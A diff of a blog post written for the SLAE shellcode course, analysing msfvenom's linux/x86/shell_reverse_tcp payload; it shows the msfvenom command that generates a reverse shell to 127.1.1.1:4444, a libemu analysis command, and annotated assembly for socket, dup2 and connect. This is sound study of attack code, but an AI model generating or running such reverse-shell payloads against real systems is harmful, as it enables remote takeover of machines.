@@ -1,11 +1,10 @@
 ---
 layout: post
-title: "SLAE Problem 5.1: Msfpayload Analysis"
-description: "Analysis of Msfpayload shellcode samples"
-tags: [asm, shellcode, msfpayload]
+title: "SLAE Problem 5.1: Msfvenom Analysis of linux/x86/shell_reverse_tcp"
+description: "Analysis of Msfvenom shellcode: linux/x86/shell_reverse_tcp"
+tags: [asm, shellcode, msfvenom]
 ---
 
-# Assignment 5.1
 
 This blog post has been created for completing the requirements for the SecurityTube
 Linux Assembly Expert certification:
@@ -19,13 +18,13 @@ Student ID: SLAE-824
 - Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
 - Present your analysis
 
-### Shellcode 1: linux/x86/shell_reverse_tcp
+### Analysis
 
 Since I had created a reverse tcp shellcode for assignment 2 of the SLAE
 I decided that it would be interesting to look at msfvenom's version and
 to see how it differed from mine. To do so I did the following:
 
-Generate a linux/x86/shell_reverse_tcp binary using:
+Generate a linux/x86/shell_reverse_tcp shellcode using:
 
 {% highlight bash %}
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.1.1.1 R > revshell.bin
@@ -33,7 +32,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.1.1.1 R > revshell.bin
 
 It defaults to LPORT=4444 so there is no need to set it.
 
-Next, I ran the binary using Libemu and generated a .dot file:
+Next, I ran the shellcode using Libemu and generated a .dot file:
 
 {% highlight bash %}
 /usr/bin/sctest -vvv -S -s 10000 -G revshell.dot < revshell.bin
@@ -65,6 +64,7 @@ for assignment 2. Lets analyze things at the assembly level:
 ; Socket
 ;; Clear out ebx
 xor ebx,ebx
+
 ;; Clear out eax as eax is the implied destination
 ;; When anything is multiplied by 0 it will be zero
 ;; I'm not sure why this is done as the byte count ends up
@@ -84,7 +84,8 @@ mul ebx
 ;; Protocol INADDR_ANY Accept on any interface 0x00000000
 ;; Push this value onto the stack
 push ebx
-;; Increment ebx. This is used pushed to the stack for
+
+;; Increment ebx. This is pushed to the stack for
 ;; SOCK_STREAM socket type of 1 as well as left in
 ;; the register as 1 is the sys_socket syscall number
 inc ebx
@@ -96,9 +97,14 @@ mov al,0x66 ;; socketcall syscall
 int 0x80 ;; Call socket syscall
 
 ; Save returned file descriptor
+; Not only does it save the file descriptor but
+; It sets up ebx for the Dup2 call
+; Which is the "New File Descriptor"
+; That will be used in place of the "Old File Descriptor"
+; Killing 2 birds with 1 stone
 xchg eax,ebx
 
-; Load 0x2 into ecx for the dup2 loop
+; Load 0x2 into ecx for the dup2 loop counter and fd number
 pop ecx
 
 ; Dup2 loop
@@ -110,9 +116,13 @@ jns 0xfffffffb ; Loop
 ; Connect
 ; Build sockaddr_in structure
 push dword 0x101017f ; inet_addr("127.1.1.1") = 0x0101017f
+
 ;; Push port 4444 in big endian network byte order
-;; and sin_family of AF_INET which is 2 in 1 operation
+;; and sin_family of AF_INET
+;; This places 2  values on the stack in 1 operation
+;; This does seem to introduce a null byte though...
 push dword 0x5c110002
+
 ;; Mov pointer to sockaddr_in structure
 mov ecx,esp
 
